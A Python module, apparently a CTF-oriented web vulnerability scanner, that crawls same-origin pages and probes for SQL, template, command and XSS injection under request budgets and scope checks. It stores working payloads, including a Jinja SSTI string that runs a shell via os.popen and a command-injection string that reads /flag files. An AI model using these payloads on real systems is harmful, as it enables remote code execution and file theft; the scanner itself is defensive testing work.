from __future__ import annotations

import re
from collections import deque
from dataclasses import dataclass, field
from hashlib import sha256
from html import unescape
from html.parser import HTMLParser
from http.cookiejar import Cookie, CookieJar
from urllib.parse import parse_qsl, quote_plus, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import (
    Request,
    build_opener,
)

from .http_client import (
    read_bounded,
    scanner_handlers,
    validate_loopback_proxy,
)
from .jwt_audit import audit_jwt
from .model import Finding, ScanReport, redact_url
from .posture import inspect_response
from .session import BrowserSession, validate_session_cookie

CMD_PROBE = ";printf WCSA;printf $((7321+19));printf WCSZ"
CMD_RESULT = "WCSA7340WCSZ"
SSTI_PROBE = "{{7340*3}}"
SSTI_RESULT = "22020"
SSTI_ALTERNATE_PROBES = (
    ("dollar-brace", "${7340*3}"),
    ("erb-ejs", "<%= 7340*3 %>"),
    ("hash-brace", "#{7340*3}"),
)
XSS_PROBE = "<wcs7340>"
MAX_BODY = 1_000_000
HTML_MARKER = "<html"
COMMENT_HINTS = ("TODO", "FIXME", "BUG", "HACK", "FLAG", "SECRET", "PASSWORD", "ADMIN", "BACKDOOR", "DEBUG")
SQL_ERRORS = (
    "sql syntax", "sqlite error", "sqlite3.", "mysql_fetch", "mysqli_sql_exception",
    "pg_query", "postgresql error", "ora-", "unclosed quotation mark", "odbc sql",
)
DEBUG_ERRORS = (
    "traceback (most recent call last)", "stack trace", "werkzeug debugger",
    "debug mode", "exception in thread", "fatal error:",
)
FLAG_RE = re.compile(r"(?:flag|ctf|picoctf|htb)\s*\{[^}\r\n]{1,200}\}", re.I)
PROFILES = {
    "desktop": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
    },
    "mobile": {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Sec-CH-UA": '"Chromium";v="124", "Not-A.Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": '"Android"',
    },
}


def _line_comment_end(text: str, start: int) -> int:
    """Return the end of a `//` comment starting at a line start, or -1."""
    index = start
    while index < len(text) and text[index] in " \t":
        index += 1
    if not text.startswith("//", index) or text.startswith("#", index + 2):
        return -1
    while index < len(text) and text[index] not in "\r\n":
        index += 1
    return index


def _js_comments(text: str) -> list[str]:
    """Collect line-start `//` comments and `/* */` blocks in one linear pass."""
    comments: list[str] = []
    index = 0
    block_possible = True
    while index < len(text):
        if index == 0 or text[index - 1] == "\n":
            end = _line_comment_end(text, index)
            if end >= 0:
                comments.append(text[index:end])
                index = max(end, index + 1)
                continue
        if block_possible and text.startswith("/*", index):
            close = text.find("*/", index + 2)
            if close >= 0:
                comments.append(text[index:close + 2])
                index = close + 2
                continue
            block_possible = False
        index += 1
    return comments


def _comment_keywords(comment: str) -> set[str]:
    """Return names of interesting keywords, never raw comment content."""
    if len(comment) > 100_000:
        comment = comment[:100_000]
    return {token for token in COMMENT_HINTS
            if re.search(r"(?<![A-Za-z0-9_])" + token + r"(?![A-Za-z0-9_])",
                         comment, re.I)}


_HYPOTHESIS_RULES = (
    (r"(?:^|_)(?:id|q|query|search|user|name|item)(?:$|_)", "WEB-SQLI-001",
     "Possible SQL injection input", "'",
     "Use a parameterized query; never concatenate input into SQL."),
    (None, "WEB-SSTI-001", "Possible server-side template injection input", SSTI_PROBE,
     "Treat templates as code: select fixed templates and pass user data only as values."),
    (r"(?:^|_)(?:q|query|search|name|msg|message|comment|text|input|keyword)(?:$|_)",
     "WEB-XSS-001", "Possible reflected cross-site scripting input", XSS_PROBE,
     "Context-encode output (HTML entity/attribute/JS) and set a restrictive Content-Security-Policy."),
    (r"(?:^|_)(?:cmd|command|exec|host|ip|ping)(?:$|_)", "WEB-CMDI-001",
     "Possible command injection input", CMD_PROBE,
     "Avoid shell invocation; use fixed argument arrays and strict allowlists."),
    (r"(?:^|_)(?:file|path|page|include|template|view)(?:$|_)", "WEB-FILE-001",
     "Possible file/path injection input", "../WCS_NONEXISTENT",
     "Map identifiers to fixed server-side resources; canonicalize and enforce a root."),
    (r"(?:^|_)(?:next|url|uri|redirect|return|continue)(?:$|_)", "WEB-REDIR-001",
     "Possible open redirect or server-side URL input", "https://example.invalid/wcs",
     "Allowlist destinations and reject absolute or cross-origin URLs."),
)
# Rules whose pattern is also accepted for every parameter in generic mode.
_GENERIC_HYPOTHESES = {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-XSS-001"}
_HYPOTHESIS_EVIDENCE = {
    "WEB-SQLI-001": "database error or stable boolean response differential",
    "WEB-SSTI-001": SSTI_RESULT,
    "WEB-CMDI-001": CMD_RESULT,
    "WEB-XSS-001": f"unencoded reflection of {XSS_PROBE}",
}


def _hypothesis_applies(rule: tuple, key: str, generic: bool) -> bool:
    pattern = rule[0]
    if generic and rule[1] in _GENERIC_HYPOTHESES:
        return True
    return pattern is not None and re.search(pattern, key) is not None

_ACTIVE_PROBES = {
    "WEB-CMDI-001": CMD_PROBE,
    "WEB-SSTI-001": SSTI_PROBE,
    "WEB-FILE-001": "../WCS_NONEXISTENT_7f31a9",
    "WEB-REDIR-001": "https://example.invalid/wcs",
    "WEB-XSS-001": XSS_PROBE,
}


@dataclass
class Form:
    action: str
    method: str
    inputs: list[tuple[str, str, str]] = field(default_factory=list)


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.scripts: list[str] = []
        self.forms: list[Form] = []
        self.comment_hints: set[str] = set()
        self._form: Form | None = None
        self._select_index: int | None = None
        self._select_has_option = False
        self._select_has_selected = False
        self._option_value: str | None = None
        self._option_selected = False
        self._option_text: list[str] = []
        self._option_open = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        data = {k.lower(): (v or "") for k, v in attrs}
        name = tag.lower()
        if name in {"a", "link"} and data.get("href"):
            self._add_anchor_link(name, data)
        elif name in {"iframe", "frame"} and data.get("src"):
            self.links.append(data["src"])
        elif name == "script" and data.get("src"):
            self.scripts.append(data["src"])
        elif name == "form":
            self._start_form(data)
        elif name == "select" and self._form and data.get("name"):
            self._start_select(data)
        elif name == "option" and self._form and self._select_index is not None:
            self._add_option(attrs, data)
        elif name in {"input", "textarea"} and self._form and data.get("name"):
            self._form.inputs.append((data["name"], data.get("type", "text").lower(), data.get("value", "")))

    def _add_anchor_link(self, name: str, data: dict[str, str]) -> None:
        if name == "a" or data.get("rel", "").lower() in {"canonical", "alternate"}:
            self.links.append(data["href"])

    def _start_form(self, data: dict[str, str]) -> None:
        self._form = Form(data.get("action", ""), data.get("method", "get").upper())
        self.forms.append(self._form)
        if self._form.method == "GET" and self._form.action:
            self.links.append(self._form.action)

    def _start_select(self, data: dict[str, str]) -> None:
        self._select_index = len(self._form.inputs)
        self._select_has_option = False
        self._select_has_selected = False
        self._clear_option()
        self._form.inputs.append((data["name"], "select", ""))

    def _add_option(self, attrs: list[tuple[str, str | None]], data: dict[str, str]) -> None:
        self._finish_option()
        self._option_selected = any(key.lower() == "selected" for key, _ in attrs)
        self._option_value = data["value"] if any(
            key.lower() == "value" for key, _ in attrs) else None
        self._option_text = []
        self._option_open = True

    def _finish_option(self) -> None:
        if self._select_index is None or not self._option_open:
            return
        selected = self._option_selected
        if (selected and not self._select_has_selected) or (
                not self._select_has_option and not self._select_has_selected):
            value = self._option_value
            if value is None:
                value = " ".join("".join(self._option_text).split())
            name, kind, _ = self._form.inputs[self._select_index]
            self._form.inputs[self._select_index] = (name, kind, value)
        self._select_has_option = True
        self._select_has_selected |= selected
        self._clear_option()

    def _clear_option(self) -> None:
        self._option_value = None
        self._option_selected = False
        self._option_text = []
        self._option_open = False

    def handle_data(self, data: str) -> None:
        if self._select_index is not None:
            self._option_text.append(data)

    def handle_comment(self, data: str) -> None:
        if len(self.comment_hints) < len(COMMENT_HINTS):
            self.comment_hints.update(_comment_keywords(data))

    def handle_endtag(self, tag: str) -> None:
        name = tag.lower()
        if name == "option":
            self._finish_option()
        elif name == "select":
            self._finish_option()
            self._select_index = None
            self._select_has_option = False
            self._select_has_selected = False
        elif name == "form":
            self._finish_option()
            self._form = None
            self._select_index = None


@dataclass
class Response:
    url: str
    status: int
    headers: dict[str, str]
    text: str
    cookie_headers: tuple[str, ...] = ()


@dataclass(frozen=True)
class PageObservation:
    url: str
    status: int
    body_length: int
    body_sha256: str
    forms: tuple[tuple[str, str, tuple[str, ...]], ...]
    parameters: tuple[str, ...]


class Scanner:
    def __init__(self, target: str, *, active: bool = False, max_pages: int = 20,
                 timeout: float = 5.0, max_requests: int = 80, verify_tls: bool = True,
                 profile: str = "desktop", session: BrowserSession | None = None,
                 proxy: str | None = None,
                 inventory_urls: tuple[str, ...] = (),
                 ssti_alternates: bool = False,
                 nosql_query: bool = False) -> None:
        parsed = urlsplit(target)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc or parsed.username or parsed.password:
            raise ValueError("target must be an absolute http:// or https:// URL")
        self.target = self._clean_url(target)
        self.origin = (parsed.scheme.lower(), parsed.netloc.lower())
        self.active = active
        self.ssti_alternates = ssti_alternates
        self.nosql_query = nosql_query
        self.max_pages = max(1, max_pages)
        self.timeout = max(0.1, timeout)
        self.max_requests = max(1, max_requests)
        if profile not in PROFILES:
            raise ValueError("profile must be desktop or mobile")
        self.profile = profile
        self.session = session
        self.proxy = self._validate_proxy(proxy)
        if len(inventory_urls) > 100 or any(
                not self._in_scope(url) or urlsplit(url).username or urlsplit(url).password
                for url in inventory_urls):
            raise ValueError("inventory seeds must be bounded same-origin HTTP URLs")
        self.inventory_urls = tuple(sorted({self._clean_url(url) for url in inventory_urls}))
        self.requests_sent = 0
        self.observations: dict[str, PageObservation] = {}
        self.cookies = CookieJar()
        if session:
            self._import_session_cookies(session)
        self.opener = build_opener(*scanner_handlers(
            self.origin, self.cookies, verify_tls=verify_tls, proxy=self.proxy,
        ))

    @staticmethod
    def _validate_proxy(proxy: str | None) -> str | None:
        return validate_loopback_proxy(proxy)

    def _import_session_cookies(self, session: BrowserSession) -> None:
        host = urlsplit(self.target).hostname or ""
        for item in session.cookies:
            validate_session_cookie(item.name, item.value, item.domain, item.path)
            domain = item.domain.lstrip(".") or host
            if host != domain and not host.endswith("." + domain):
                raise ValueError("captured session contains a cookie outside the target origin")
            self.cookies.set_cookie(Cookie(
                version=0, name=item.name, value=item.value, port=None, port_specified=False,
                domain=domain, domain_specified=bool(item.domain),
                domain_initial_dot=item.domain.startswith("."), path=item.path or "/",
                path_specified=True, secure=item.secure, expires=item.expires,
                discard=item.expires is None, comment=None, comment_url=None,
                rest={"HttpOnly": item.http_only, "SameSite": item.same_site}, rfc2109=False,
            ))

    @staticmethod
    def _clean_url(url: str) -> str:
        p = urlsplit(url)
        return urlunsplit((p.scheme.lower(), p.netloc.lower(), p.path or "/", p.query, ""))

    def _in_scope(self, url: str) -> bool:
        p = urlsplit(url)
        return (p.scheme.lower(), p.netloc.lower()) == self.origin

    def _request(self, url: str, method: str = "GET", data: bytes | None = None) -> Response:
        if self.requests_sent >= self.max_requests:
            raise RuntimeError("request budget exhausted")
        if not self._in_scope(url):
            raise ValueError("cross-origin request blocked")
        self.requests_sent += 1
        headers = {
            **PROFILES[self.profile],
            "Accept": "text/html,application/json,text/plain,*/*;q=0.5",
            "Accept-Language": "en-US,en;q=0.8",
            "Cache-Control": "no-store, no-cache, max-age=0",
            "Pragma": "no-cache",
        }
        if self.session:
            headers.update(dict(self.session.headers))
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = Request(url, data=data, method=method, headers=headers)
        result = read_bounded(self.opener, req, self.timeout, MAX_BODY)
        charset = ("utf-8" if result.http_error else
                   (result.headers.get_content_charset() or "utf-8"))
        cookies = tuple(result.headers.get_all("Set-Cookie", [])) if hasattr(
            result.headers, "get_all") else ()
        return Response(result.url, result.status,
                        {k.lower(): v for k, v in result.headers.items()},
                        result.body.decode(charset, "replace"), cookies)

    def _finding(self, **kwargs: object) -> Finding:
        kwargs.setdefault("profile", self.profile)
        headers = {**PROFILES[self.profile]}
        if self.session:
            headers.update(dict(self.session.headers))
        kwargs.setdefault("client_headers", tuple(sorted(
            (name, value) for name, value in headers.items()
            if name.lower() in {"user-agent", "accept-language", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"}
        )))
        if "session_cookies" not in kwargs:
            kwargs["session_cookies"] = tuple(sorted((cookie.name, cookie.value) for cookie in self.cookies))
        return Finding(**kwargs)  # type: ignore[arg-type]

    @staticmethod
    def _observe(response: Response, parser: PageParser) -> PageObservation:
        forms = tuple(sorted(
            (form.method, form.action, tuple(sorted(name for name, _, _ in form.inputs)))
            for form in parser.forms
        ))
        parameters = {name for form in parser.forms for name, _, _ in form.inputs}
        parameters.update(name for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True))
        encoded = response.text.encode("utf-8", "replace")
        return PageObservation(
            url=response.url,
            status=response.status,
            body_length=len(encoded),
            body_sha256=sha256(encoded).hexdigest(),
            forms=forms,
            parameters=tuple(sorted(parameters)),
        )

    def _jwt_metadata_hints(self, response: Response) -> list[Finding]:
        """Inspect JWT-shaped tokens in already-read text/cookies without disclosure."""
        candidates = []
        for token in re.findall(
            r"(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{4,1200}\.eyJ[A-Za-z0-9_-]{4,1200}\.[A-Za-z0-9_-]{0,1500})(?![A-Za-z0-9_-])",
            response.text[:MAX_BODY],
        )[:5]:
            candidates.append(("response", token))
        for cookie in list(self.cookies)[:50]:
            if cookie.value and cookie.value.startswith("eyJ") and cookie.value.count(".") == 2:
                candidates.append(("cookie", cookie.value))
                if len(candidates) >= 10:
                    break
        sources = set()
        signals = set()
        for source, token in candidates[:10]:
            try:
                audit = audit_jwt(token)
            except ValueError:
                continue
            sources.add(source)
            signals.update(item["rule"] for item in audit["signals"])
        if not sources:
            return []
        return [self._finding(
            rule="WEB-JWT-METADATA-001",
            title="JWT-shaped authentication metadata observed",
            severity="info", confidence="low", url=response.url,
            evidence=("JWT-like token found in " + ", ".join(sorted(sources)) +
                      "; review categories: " + (", ".join(sorted(signals)) or "none") +
                      "; token, cookie names and claim values omitted."),
            vector=f"Review the existing GET {redact_url(response.url)} response and local session securely.",
            patch="Verify JWT signatures, issuer, audience and server-side authorization with a strict algorithm allowlist.",
            session_cookies=(),
        )]

    def _posture_findings(self, response: Response, method: str = "GET") -> list[Finding]:
        """Analyze existing response metadata without additional HTTP requests.

        Document policies apply only to HTML GET documents. Other responses
        are eligible for the CORS consistency signal only.
        """
        content_type = response.headers.get("content-type", "").lower()
        is_document = (method == "GET" and 200 <= response.status < 300
                       and ("text/html" in content_type or
                            (HTML_MARKER in response.text[:500].lower() and
                             not content_type.startswith(("application/json", "text/plain")))))
        path = urlsplit(response.url).path or "/"
        observations = inspect_response(
            method, path, "Document" if is_document else "Other",
            response.status, response.headers, self.origin[0] == "https",
            cookie_headers=response.cookie_headers or None,
        )
        patches = {
            "HEADER-HSTS": "Configure Strict-Transport-Security on HTTPS responses.",
            "HEADER-CSP": "Set a restrictive Content-Security-Policy tailored to the application.",
            "HEADER-NOSNIFF": "Send X-Content-Type-Options: nosniff.",
            "HEADER-FRAMING": "Apply CSP frame-ancestors or X-Frame-Options to restrict framing.",
            "HEADER-CORS-CONFLICT": "Avoid combining wildcard allowed origins with credentialed CORS; configure explicit trusted origins.",
            "COOKIE-SECURE": "Set Secure on HTTPS cookies.",
            "COOKIE-HTTPONLY": "Set HttpOnly for cookies not intended for JavaScript.",
            "COOKIE-SAMESITE": "Select an explicit SameSite policy appropriate to the application.",
            "COOKIE-SAMESITE-NONE": "Use Secure together with SameSite=None.",
        }
        return [self._finding(
            rule=item["rule"], title=item["title"],
            severity=item["severity"], confidence=item["confidence"],
            url=response.url, method=method, evidence=item["evidence"],
            vector=f"{method} {redact_url(response.url)}; inspect response headers.",
            patch=patches.get(item["rule"], "Review the response header configuration."),
        ) for item in observations]

    def _passive_findings(self, response: Response, parser: PageParser) -> list[Finding]:
        out: list[Finding] = self._jwt_metadata_hints(response)
        low = response.text.lower()
        if any(token in low for token in DEBUG_ERRORS):
            out.append(self._finding(rule="WEB-DEBUG-001", title="Debug or stack-trace disclosure",
                severity="medium", confidence="high", url=response.url,
                evidence="The response contains a deterministic debug/stack-trace signature.",
                vector=f"GET {redact_url(response.url)}",
                patch="Disable production debug mode; return generic errors and keep traces in server-side logs."))
        if re.search(r"<title>\s*index of /", response.text, re.I):
            out.append(self._finding(rule="WEB-LIST-001", title="Directory listing exposed",
                severity="medium", confidence="high", url=response.url,
                evidence="HTML title matches an automatic directory index.", vector=f"GET {redact_url(response.url)}",
                patch="Disable directory indexes and explicitly publish only required files."))
        if self.origin[0] == "http" and any(t == "password" for form in parser.forms for _, t, _ in form.inputs):
            out.append(self._finding(rule="WEB-HTTP-001", title="Password submitted over cleartext HTTP",
                severity="high", confidence="high", url=response.url,
                evidence="A password input is served from an HTTP origin.",
                vector="Observe the password-bearing request on the network path.",
                patch="Serve the challenge over HTTPS and redirect HTTP before rendering login forms."))
        flag = FLAG_RE.search(response.text)
        if flag:
            out.append(self._finding(rule="WEB-FLAG-CANDIDATE-001", title="Flag-shaped value in passive response",
                severity="medium", confidence="medium", url=response.url,
                evidence=f"Response contains a flag-shaped candidate: {flag.group(0)[:220]}",
                vector=f"GET {redact_url(response.url)} and verify that the value is accepted by the challenge.",
                flag_path="The value may be a decoy, example, or real flag. Passive text alone cannot distinguish them.",
                patch="Remove secrets from public responses and enforce authorization at the data boundary."))
        if parser.comment_hints:
            out.append(self._comment_hint_finding(response, parser.comment_hints))
        for form in parser.forms:
            defaults = tuple((name, value) for name, input_type, value in form.inputs
                             if input_type not in {"submit", "button", "image", "reset", "file"})
            action = self._clean_url(urljoin(response.url, form.action or response.url))
            if not self._in_scope(action):
                continue
            for name, input_type, _ in form.inputs:
                user_controlled = input_type not in {
                    "hidden", "submit", "button", "image", "reset", "file"
                }
                out.extend(self._parameter_hypotheses(
                    action, form.method, name, defaults, generic=user_controlled
                ))
        for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True):
            out.extend(self._parameter_hypotheses(
                response.url, "GET", name,
                tuple(parse_qsl(urlsplit(response.url).query, keep_blank_values=True)),
                generic=True,
            ))
        return out

    def _parameter_hypotheses(self, url: str, method: str, name: str,
                              defaults: tuple[tuple[str, str], ...] = (), *,
                              generic: bool = False) -> list[Finding]:
        key = name.lower()
        rules = [rule for rule in _HYPOTHESIS_RULES if _hypothesis_applies(rule, key, generic)]
        return [self._finding(rule=rule, title=title, severity="info", confidence="low", url=url,
            parameter=name, evidence=f"Parameter name '{name}' in a {method} form/query matches a sink-oriented heuristic; no vulnerability is claimed.",
            vector=f"{method} {redact_url(url)} with {name}={payload!r}", patch=patch,
            method=method, request_fields=defaults, proof_payload=payload,
            expected_evidence=_HYPOTHESIS_EVIDENCE.get(rule, "status/body differential"))
            for _, rule, title, payload, patch in rules]

    @staticmethod
    def _set_query(url: str, parameter: str, value: str) -> str:
        p = urlsplit(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        replaced = False
        out = []
        for k, v in pairs:
            if k == parameter:
                out.append((k, value)); replaced = True
            else:
                out.append((k, v))
        if not replaced:
            out.append((parameter, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), ""))

    def _send_probe(self, finding: Finding, value: str) -> Response:
        fields = dict(finding.request_fields)
        fields[finding.parameter] = value
        if finding.method == "POST":
            return self._request(finding.url, "POST", urlencode(fields).encode())
        url = finding.url
        for key, field_value in fields.items():
            url = self._set_query(url, key, field_value)
        return self._request(url)

    def _active_probe(self, finding: Finding) -> Finding | None:
        if finding.parameter == "" or self.requests_sent + 2 > self.max_requests:
            return None
        probe = _ACTIVE_PROBES.get(finding.rule, "'")
        baseline, tested = self._send_probe(finding, "WCSBASE"), self._send_probe(finding, probe)
        return (
            self._confirm_sqli_error(finding, probe, baseline, tested)
            or self._confirm_sqli_boolean(finding)
            or self._confirm_ssti(finding, baseline, tested)
            or self._confirm_ssti_alternates(finding, baseline)
            or self._confirm_cmdi(finding, probe, baseline, tested)
            or self._confirm_redirect(finding, probe, tested)
            or self._confirm_file_path(finding, probe, baseline, tested)
            or self._confirm_xss(finding, probe, baseline, tested)
        )

    def _confirm_sqli_error(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        body_low = tested.text.lower()
        if finding.rule == "WEB-SQLI-001" and any(sig in body_low for sig in SQL_ERRORS) and not any(sig in baseline.text.lower() for sig in SQL_ERRORS):
            return self._finding(rule=finding.rule, title="SQL injection error behavior confirmed", severity="high", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="A quote introduces a database error signature absent from the baseline response.",
                vector=f"{method} {redact_url(finding.url)} with {finding.parameter}=' confirms parser reachability; derive a DB-specific read-only UNION/boolean payload manually.",
                patch="Use prepared statements with bound parameters and a least-privileged database account.",
                flag_path="The parameter reaches a SQL parser. Recovering the flag still requires schema/context discovery; this scan does not extract data.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="database error signature absent from baseline")
        return None

    def _confirm_sqli_boolean(self, finding: Finding) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-SQLI-001" and self.requests_sent + 4 <= self.max_requests:
            true_payload = "' OR '1'='1'-- "
            false_payload = "' OR '1'='2'-- "
            true_one, false_one = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)
            true_two, false_two = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)

            def sql_signature(response: Response, payload: str) -> tuple[int, str]:
                # Remove simple reflection before comparing. This prevents an echo
                # endpoint from becoming a false SQLi confirmation.
                text = unescape(response.text)
                for reflected in (payload, quote_plus(payload)):
                    text = text.replace(reflected, "[INPUT]")
                return response.status, sha256(text.encode("utf-8", "replace")).hexdigest()

            true_sig = sql_signature(true_one, true_payload)
            false_sig = sql_signature(false_one, false_payload)
            if (true_sig == sql_signature(true_two, true_payload)
                    and false_sig == sql_signature(false_two, false_payload)
                    and true_sig != false_sig):
                return self._finding(
                    rule=finding.rule, title="SQL injection boolean behavior confirmed",
                    severity="high", confidence="high", url=finding.url,
                    parameter=finding.parameter,
                    evidence=("Two repeated tautology requests and two repeated contradiction "
                              "requests produced stable, distinct responses after removing input reflection."),
                    vector=(f"{method} {redact_url(finding.url)}: compare "
                            f"{finding.parameter}={true_payload!r} with "
                            f"{finding.parameter}={false_payload!r}."),
                    patch="Use prepared statements with bound parameters and a least-privileged database account.",
                    flag_path=("Boolean SQL evaluation is proven. Derive schema-specific extraction only from "
                               "the observed DB/query context; no universal flag query can be claimed."),
                    method=method, request_fields=finding.request_fields,
                    proof_payload=true_payload,
                    expected_evidence="stable response differs from the contradiction pair",
                )
        return None

    def _confirm_ssti(self, finding: Finding, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if (finding.rule == "WEB-SSTI-001" and SSTI_RESULT in tested.text
                and SSTI_RESULT not in baseline.text and SSTI_RESULT not in SSTI_PROBE):
            recovery = "{{cycler.__init__.__globals__.os.popen('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null').read()}}"
            return self._finding(
                rule=finding.rule, title="Jinja-style template expression evaluation confirmed",
                severity="critical", confidence="high", url=finding.url,
                parameter=finding.parameter,
                evidence=f"The response contains computed result {SSTI_RESULT}, absent from the payload and baseline.",
                vector=(f"Proof: {method} {redact_url(finding.url)} with "
                        f"{finding.parameter}={SSTI_PROBE!r}. Recovery: same request with the supplied payload."),
                patch="Do not compile user-controlled template source; render fixed templates with user data as values.",
                exploit_status="payload-ready", method=method,
                request_fields=finding.request_fields, proof_payload=SSTI_PROBE,
                expected_evidence=SSTI_RESULT, recovery_payload=recovery,
                flag_path="Jinja expression syntax was verified; the recovery payload reads common CTF flag paths.",
            )
        return None

    def _confirm_ssti_alternates(self, finding: Finding, baseline: Response) -> Finding | None:
        method = finding.method
        if (self.ssti_alternates and finding.rule == "WEB-SSTI-001"
                and SSTI_RESULT not in baseline.text):
            # Repeated arithmetic evaluations only; never infer an RCE payload.
            # Each pair is budget-checked and the target is not probed at all
            # unless the operator explicitly enabled --active.
            for family, alternate in SSTI_ALTERNATE_PROBES:
                if self.requests_sent + 2 > self.max_requests:
                    break
                first, second = self._send_probe(finding, alternate), self._send_probe(finding, alternate)
                if (SSTI_RESULT not in alternate
                        and SSTI_RESULT in first.text and SSTI_RESULT in second.text
                        and first.status == second.status
                        and sha256(first.text.encode()).digest() ==
                            sha256(second.text.encode()).digest()):
                    return self._finding(
                        rule=finding.rule,
                        title="Alternative template arithmetic syntax evaluated",
                        severity="high", confidence="medium", url=finding.url,
                        parameter=finding.parameter,
                        evidence=(f"Two identical {family} arithmetic probes yielded "
                                  f"computed result {SSTI_RESULT}, absent from the "
                                  "baseline and submitted expression; template engine "
                                  "and exploitability still require manual verification."),
                        vector=(f"Repeat {method} {redact_url(finding.url)} with "
                                f"{finding.parameter}={alternate!r}."),
                        patch="Never render user-supplied template source; pass untrusted input only as data.",
                        exploit_status="validation-only", method=method,
                        request_fields=finding.request_fields,
                        proof_payload=alternate, expected_evidence=SSTI_RESULT,
                        flag_path="Only arithmetic evaluation was observed; no automatic recovery payload exists.",
                    )
        return None

    def _confirm_cmdi(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-CMDI-001" and CMD_RESULT in tested.text and CMD_RESULT not in baseline.text and CMD_RESULT not in CMD_PROBE:
            recovery = ";printf WCSA;cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null;printf WCSZ"
            return self._finding(rule=finding.rule, title="Command injection arithmetic execution confirmed", severity="critical", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence=f"The response contains delimited computed output {CMD_RESULT}; that result is absent from both payload and baseline.",
                vector=f"Proof: {method} {redact_url(finding.url)} with {finding.parameter}={CMD_PROBE!r}. Recovery: same request with {finding.parameter}={recovery!r}.",
                patch="Remove shell execution; call the intended program with a fixed argument vector and allowlisted values.",
                exploit_status="payload-ready",
                flag_path=f"The verified shell syntax supports the recovery payload for {finding.parameter}; the scanner does not submit it automatically.",
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=CMD_RESULT, recovery_payload=recovery)
        return None

    def _confirm_redirect(self, finding: Finding, probe: str, tested: Response) -> Finding | None:
        method = finding.method
        location = tested.headers.get("location", "")
        if finding.rule == "WEB-REDIR-001" and location and urlsplit(urljoin(finding.url, location)).netloc == "example.invalid":
            return self._finding(rule=finding.rule, title="Cross-origin redirect confirmed", severity="medium", confidence="high",
                url=finding.url, parameter=finding.parameter,
                evidence="The response navigation reaches the supplied external origin.", vector=f"Set {finding.parameter}=https://example.invalid/wcs",
                patch="Resolve redirects against a strict same-origin path allowlist.", method=method,
                request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence="Location header points to example.invalid")
        return None

    def _confirm_file_path(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-FILE-001" and tested.status != baseline.status:
            return self._finding(rule=finding.rule, title="Path input changes resource behavior", severity="low", confidence="medium",
                url=finding.url, parameter=finding.parameter,
                evidence=f"A traversal-shaped nonexistent path changes HTTP status {baseline.status} -> {tested.status}; no file was read.",
                vector=f"Set {finding.parameter}=../WCS_NONEXISTENT_7f31a9 to reproduce the differential.", patch=finding.patch,
                method=method, request_fields=finding.request_fields, proof_payload=probe,
                expected_evidence=f"HTTP status differs from baseline {baseline.status}")
        return None

    def _confirm_xss(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
        method = finding.method
        if finding.rule == "WEB-XSS-001" and XSS_PROBE in tested.text and XSS_PROBE not in baseline.text:
            ctype = tested.headers.get("content-type", "").lower()
            if "html" in ctype or HTML_MARKER in tested.text[:500].lower():
                return self._finding(rule=finding.rule, title="Reflected HTML/script injection confirmed", severity="high", confidence="high",
                    url=finding.url, parameter=finding.parameter,
                    evidence=f"The marker {XSS_PROBE} is reflected unencoded in an HTML response and is absent from the baseline, so '<' and '>' are not entity-encoded.",
                    vector=f"Proof: {method} {redact_url(finding.url)} with {finding.parameter}={XSS_PROBE!r}. Escalate manually to a script payload within the reflection context.",
                    patch=finding.patch,
                    flag_path="Unencoded reflection is proven. A working XSS payload depends on the surrounding HTML/JS context and is not injected automatically.",
                    method=method, request_fields=finding.request_fields, proof_payload=probe,
                    expected_evidence=f"unencoded {XSS_PROBE} absent from baseline")
        return None

    def _nosql_query_review(self, finding: Finding) -> Finding | None:
        """Conservative repeated GET scalar/bracket differential; never proof."""
        if self.requests_sent + 4 > self.max_requests:
            return None
        if finding.method != "GET" or not re.fullmatch(
                r"[A-Za-z]\w{0,39}", finding.parameter, re.ASCII):
            return None
        params = parse_qsl(urlsplit(finding.url).query, keep_blank_values=True)
        if finding.parameter not in {key for key, _ in params}:
            return None
        if any(k.lower() in finding.parameter.lower() for k in
               ("password", "token", "secret", "session", "csrf")):
            return None
        marker = "WCS_NONMATCH_7340"
        normal_url = self._set_query(finding.url, finding.parameter, marker)
        parts = urlsplit(finding.url)
        operator_query = [(k, v) for k, v in params if k != finding.parameter]
        operator_query.append((finding.parameter + "[$ne]", marker))
        operator_url = urlunsplit((
            parts.scheme, parts.netloc, parts.path, urlencode(operator_query), "",
        ))
        baseline_a = self._request(normal_url)
